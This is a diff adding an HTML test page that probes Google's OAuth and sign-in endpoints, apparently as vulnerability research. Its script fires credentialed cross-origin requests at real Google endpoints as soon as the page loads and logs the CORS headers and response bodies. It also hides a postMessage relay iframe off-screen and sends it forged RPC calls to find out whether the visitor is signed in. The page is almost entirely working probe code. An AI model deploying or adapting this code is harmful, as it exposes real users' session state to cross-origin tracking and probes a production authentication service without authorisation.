@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Google OAuth Relay Surface Test</title>
+<style>
+body { font-family: monospace; font-size: 12px; background: #111; color: #ccc; padding: 16px; }
+.ok    { color: #4f4; }
+.fail  { color: #f44; }
+.warn  { color: #fa4; }
+.head  { color: #4af; font-weight: bold; }
+pre    { margin: 2px 0; }
+.section { border-top: 1px solid #444; margin-top: 12px; padding-top: 8px; }
+</style>
+</head>
+<body>
+<div id="out"></div>
+<script>
+var out = document.getElementById('out');
+function log(msg, cls) {
+  var pre = document.createElement('pre');
+  pre.className = cls || '';
+  pre.textContent = msg;
+  out.appendChild(pre);
+  console.log(msg);
+}
+function section(title) {
+  var d = document.createElement('div');
+  d.className = 'section';
+  d.innerHTML = '<pre class="head">═══ ' + title + ' ═══</pre>';
+  out.appendChild(d);
+}
+
+// ─── 1. FETCH-BASED CORS PROBE ────────────────────────────────────────────
+// Test each endpoint: send credentialed fetch with cross-origin, read result
+async function probeFetch(label, url, opts) {
+  log('[>] ' + label + '  →  ' + url.split('?')[0]);
+  opts = Object.assign({ credentials: 'include', mode: 'cors' }, opts || {});
+  try {
+    var r = await fetch(url, opts);
+    var body = await r.text().catch(()=>'<body read failed>');
+    var acao = r.headers.get('access-control-allow-origin') || '(none)';
+    var acac = r.headers.get('access-control-allow-credentials') || '(none)';
+    var cd   = r.headers.get('content-disposition') || '';
+    var cls  = (acao !== '(none)' && acac === 'true') ? 'ok' : 'warn';
+    log('    STATUS ' + r.status + '  ACAO=' + acao + '  ACAC=' + acac, cls);
+    if (body && body.length < 600) log('    BODY: ' + body.replace(/\n/g,' ').slice(0,400), 'ok');
+    else if (body) log('    BODY(' + body.length + '): ' + body.slice(0,200).replace(/\n/g,' ') + '...', 'warn');
+  } catch(e) {
+    log('    CORS BLOCKED: ' + e.message, 'fail');
+  }
+  log('');
+}
+
+// ─── 2. POSTMESSAGE RELAY ────────────────────────────────────────────────
+function testPostmessageRelay() {
+  section('postmessageRelay — iframe + gadgets.rpc');
+  log('[*] Loading postmessageRelay iframe...');
+
+  var RPCTOKEN = 'tok_' + Math.random().toString(36).slice(2);
+  var iframe = document.createElement('iframe');
+  iframe.src = 'https://accounts.google.com/o/oauth2/postmessageRelay?parent=' +
+    encodeURIComponent(location.origin) + '&rpctoken=' + RPCTOKEN;
+  iframe.style.cssText = 'position:absolute;top:-9999px;width:1px;height:1px';
+
+  var sent = false;
+  function sendCheck(target) {
+    if (sent) return; sent = true;
+    log('[*] Sending check_session_state (f="..", t=null, a=["",""])...');
+    // Try format WITHOUT !_ prefix (what the relay actually handles for incoming)
+    var msg = JSON.stringify({s:"check_session_state",f:"..",c:"cid1",a:["",""],t:null,l:null,g:true});
+    log('[*] msg: ' + msg);
+    target.postMessage(msg, 'https://accounts.google.com');
+
+    // Also try camelCase variant (checkSessionState — registered via u() in the JS)
+    var msg2 = JSON.stringify({s:"checkSessionState",f:"..",c:"cid2",a:["",""],t:null,l:null,g:true});
+    target.postMessage(msg2, 'https://accounts.google.com');
+
+    // Also try get_versioninfo (registered handler T)
+    var msg3 = JSON.stringify({s:"get_versioninfo",f:"..",c:"cid3",a:["0",""],t:null,l:null,g:true});
+    target.postMessage(msg3, 'https://accounts.google.com');
+    log('[*] Sent 3 RPC calls, waiting for response...');
+  }
+
+  window.addEventListener('message', function(e) {
+    if (e.origin !== 'https://accounts.google.com') return;
+    var raw = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
+    log('[MSG relay] ' + raw.slice(0, 300));
+
+    // Catch ready signal
+    if (raw.indexOf('oauth2relayReady') !== -1 || raw.indexOf('relayReady') !== -1) {
+      log('[+] Relay ready! Sending check now.', 'ok');
+      sendCheck(e.source);
+    }
+    // Catch any callback response
+    if (raw.indexOf('cb') !== -1 && raw.indexOf('"a"') !== -1) {
+      try {
+        var clean = raw.replace(/^!_/,'');
+        var msg = JSON.parse(clean);
+        if (msg.a && msg.a.length >= 2) {
+          var result = msg.a[1];
+          var interpretation = result === false ? 'LOGGED IN (has SAPISID)' :
+                               result === true  ? 'NOT logged in' :
+                               'value: ' + JSON.stringify(result);
+          log('[!!!] check_session_state RESULT: ' + interpretation, result === false ? 'ok' : 'warn');
+        }
+      } catch(x){}
+    }
+  });
+
+  document.body.appendChild(iframe);
+  // Fallback after 1200ms if no ready signal
+  setTimeout(function() {
+    if (!sent) {
+      log('[!] No ready signal in 1200ms — trying fallback send to iframe');
+      sendCheck(iframe.contentWindow);
+    }
+  }, 1200);
+}
+
+// ─── MAIN ────────────────────────────────────────────────────────────────
+(async function() {
+  log('[*] Origin: ' + location.origin);
+  log('[*] Testing all Google OAuth relay surfaces...');
+  log('');
+
+  // ─ A. gsi/status — confirmed any-origin ACAC:true in prior session
+  section('gsi/status — credentialed cross-origin fetch');
+  log('[!] KNOWN: any origin gets ACAC:true — testing what the body reveals');
+  // Without client_id first (baseline)
+  await probeFetch('gsi/status (no client_id)',
+    'https://accounts.google.com/gsi/status');
+  // With a dummy client_id format (may get different response)
+  await probeFetch('gsi/status (with client_id param)',
+    'https://accounts.google.com/gsi/status?client_id=1049687047278-s35ef5r784fe3i5bkr3td1lsuumv8fi9.apps.googleusercontent.com&cas=&bs=');
+
+  // ─ B. gsi/revoke — any-origin ACAC:true
+  section('gsi/revoke — credentialed cross-origin fetch');
+  await probeFetch('gsi/revoke (GET, no body)',
+    'https://accounts.google.com/gsi/revoke');
+
+  // ─ C. Standard OAuth endpoints — CORS check
+  section('Standard OAuth endpoints — CORS probe');
+  await probeFetch('openidconnect.googleapis.com/v1/userinfo (no token)',
+    'https://openidconnect.googleapis.com/v1/userinfo');
+  await probeFetch('oauth2.googleapis.com/revoke (no token)',
+    'https://oauth2.googleapis.com/revoke');
+  await probeFetch('www.googleapis.com/oauth2/v3/certs (public)',
+    'https://www.googleapis.com/oauth2/v3/certs');
+  await probeFetch('accounts.google.com/o/oauth2/v2/auth (GET no params)',
+    'https://accounts.google.com/o/oauth2/v2/auth');
+
+  // ─ D. More accounts.google.com relay-like endpoints
+  section('Other accounts.google.com endpoints');
+  await probeFetch('accounts.google.com/gsi/select (POST-based)',
+    'https://accounts.google.com/gsi/select');
+  await probeFetch('accounts.google.com/gsi/button',
+    'https://accounts.google.com/gsi/button');
+  await probeFetch('accounts.google.com/gsi/issue',
+    'https://accounts.google.com/gsi/issue');
+  await probeFetch('accounts.google.com/gsi/fedcm/listaccounts',
+    'https://accounts.google.com/gsi/fedcm/listaccounts');
+  await probeFetch('accounts.google.com/gsi/log',
+    'https://accounts.google.com/gsi/log');
+
+  // ─ E. Token endpoint CORS check
+  section('oauth2.googleapis.com token endpoints');
+  await probeFetch('oauth2.googleapis.com/token (no body)',
+    'https://oauth2.googleapis.com/token', {method:'POST', body:'grant_type=authorization_code'});
+  await probeFetch('oauth2.googleapis.com/device/code',
+    'https://oauth2.googleapis.com/device/code');
+
+  // ─ F. postmessageRelay iframe test (async — runs in parallel)
+  testPostmessageRelay();
+
+  log('');
+  log('[*] Fetch tests complete. postmessageRelay test running in background (watch above for [MSG relay] lines)...', 'head');
+})();
+</script>
+</body>
+</html>
